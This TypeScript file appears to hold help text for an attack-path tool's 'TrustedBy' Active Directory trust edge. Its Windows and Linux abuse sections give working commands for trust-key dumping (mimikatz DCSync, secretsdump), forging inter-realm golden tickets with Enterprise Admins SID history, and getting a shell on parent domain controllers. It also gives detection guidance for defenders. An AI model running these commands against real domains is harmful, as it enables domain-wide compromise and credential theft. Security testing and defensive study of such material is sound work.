import type { EdgeHelpText } from './types';

export const adTrustEdges: EdgeHelpText[] = [
  {
    kind: 'TrustedBy',
    category: 'AD Trust',
    general:
      'The TrustedBy edge indicates that one Active Directory domain trusts another, allowing authentication principals from the trusted domain to access resources in the trusting domain. Trust relationships can be one-way (Domain A trusts Domain B, but not vice versa), two-way (bidirectional), and either transitive (extending through a chain of trusts, as in forest trusts) or non-transitive. Parent-child domain trusts within a forest are always two-way transitive. Trust abuse is a critical attack vector because compromising a single domain in a trust chain can enable escalation to other domains, particularly through the exploitation of SID filtering gaps, trust keys, and cross-domain Kerberos delegation.',
    windowsAbuse: `# Enumerate all trust relationships
Get-DomainTrust
Get-DomainTrust -Domain parent.local
nltest /domain_trusts /all_trusts /v

# Enumerate trust direction and properties
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType, TrustAttributes

# Parent-Child Trust Escalation (requires DA in the child domain)
# Step 1: Get the trust key via DCSync
mimikatz # lsadump::dcsync /domain:child.parent.local /user:parent$

# Or dump the trust key directly from LSASS
mimikatz # lsadump::trust /patch

# Step 2: Forge an inter-realm Golden Ticket with SID History for Enterprise Admins
mimikatz # kerberos::golden /domain:child.parent.local /sid:S-1-5-21-<child-sid> /sids:S-1-5-21-<parent-sid>-519 /rc4:<trust-key> /user:Administrator /service:krbtgt /target:parent.local /ticket:trust.kirbi

# Step 3: Use the inter-realm ticket to request a TGS in the parent domain
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parent.local /dc:dc.parent.local /ptt

# External/Forest Trust Abuse (SID filtering may be enforced)
# If SID filtering is disabled or misconfigured:
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-<domain-sid> /sids:S-1-5-21-<foreign-sid>-519 /rc4:<trust-key> /user:Administrator /service:krbtgt /target:foreign.local /ticket:trust.kirbi

# If SID filtering IS enforced, you can still access resources explicitly shared with the trusted domain
# Enumerate foreign group memberships
Get-DomainForeignGroupMember -Domain foreign.local

# Enumerate foreign ACLs
Find-InterestingDomainAcl -Domain foreign.local -ResolveGUIDs`,
    linuxAbuse: `# Enumerate trusts using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get trusts

# Parent-Child Trust Escalation using impacket
# Step 1: Dump the trust key via secretsdump
secretsdump.py child.parent.local/administrator:'Password'@dc.child.parent.local -just-dc-user 'parent$'

# Step 2: Use raiseChild.py for automated parent-child escalation
raiseChild.py child.parent.local/administrator:'Password' -target-exec dc.parent.local

# Step 3: Or manually forge the inter-realm ticket with ticketer
ticketer.py -nthash <trust-key> -domain child.parent.local -domain-sid S-1-5-21-<child-sid> -extra-sid S-1-5-21-<parent-sid>-519 -spn krbtgt/parent.local Administrator

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
getST.py -k -no-pass -spn cifs/dc.parent.local parent.local/Administrator
psexec.py -k -no-pass dc.parent.local

# Enumerate foreign domain resources accessible to us
GetUserSPNs.py -target-domain parent.local child.parent.local/administrator:'Password' -dc-ip dc.parent.local`,
    opsec:
      'Cross-domain authentication generates Event ID 4768 (TGT requested) with a cross-domain referral on the trusting domain DC. Event ID 4769 (TGS requested) is generated for the inter-realm service ticket. Golden Tickets forged with SID History for Enterprise Admins (SID -519) can be detected by looking for TGTs with unexpected extra SIDs in the PAC. Trust modifications generate Event ID 4706 (A new trust was created to a domain) and Event ID 4707 (A trust to a domain was removed). SID filtering violations produce authentication failures with status 0xC000015B. Monitor for Event ID 4624 (Logon) from foreign domain SIDs, particularly to sensitive systems. The raiseChild.py automated attack generates a burst of DCSync events in the child domain followed by cross-domain authentication attempts.',
    references: [
      {
        title: 'BloodHound Documentation - TrustedBy',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312850827419-TrustedBy',
      },
      {
        title: 'SpecterOps - Not A Security Boundary: Breaking Forest Trusts',
        url: 'https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d',
      },
      {
        title: 'adsecurity.org - Active Directory Trust Information',
        url: 'https://adsecurity.org/?p=1588',
      },
      {
        title: 'The Hacker Recipes - Trusts',
        url: 'https://www.thehacker.recipes/ad/movement/trusts',
      },
      {
        title: 'HackTricks - AD Trusts',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/external-forest-domain-trusts.html',
      },
    ],
  },
];
